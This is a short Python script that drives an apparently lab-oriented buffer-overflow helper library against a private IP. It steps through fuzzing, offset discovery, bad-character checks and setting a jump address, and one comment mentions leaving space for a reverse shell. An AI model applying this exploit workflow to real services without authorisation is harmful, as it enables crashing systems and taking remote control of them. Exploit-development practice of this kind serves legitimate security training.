#!/usr/bin/env python3


from ezbuff.src.overflow import Overflow


def main():
	# Instanstantiate `Overflow` object
	test = Overflow("192.168.230.10", 80, max_fuzz_bytes=2000)
	# print(repr(test), "\n")
	# print(test)

	# Change the target IP if running in interactive Python interpreter
	# test.targ_ip = "127.0.0.1"

	# Change the target port number if running tests in interactive Python interpreter
	# test.targ_port = 443

	# The number of seconds to wait in between the fuzzing process,
	# default = 10
	# test.fuzz_interval_seconds = 2

	# Add bad characters to objects list containing bad characters found
	# after sending characters payload.
	# test.add_bad_char('\x00', '\x01', '\x02')

	# Set the increment of the fuzzer to be 150 as opposed to
	# the default of 100
	# test.fuzz_increment = 150

	# Fuzz the vulnerable application
	# test.fuzz()

	# Sets the number of bytes to crash the application.
	# Make sure to accomodate space for reverse shell!!
	test.num_bytes_crash = 1000

	# Sending pattern to determine offset
	# test.send_pattern()

	# Get offset 
	# test.get_offset("30416B30")

	# print(test.offset)

	# Set the offset after running the functions to find offset value
	test.offset = 780

	# Test offset found by `get_offset` function
	test.test_offset()

	# Set the memory address to jump to after finding valid memory address
	# containing `jump` instructions set in x86 architecture
	# test.jump_eip = "\x8f\x35\x4a\x5f"


if __name__ == '__main__':
	main()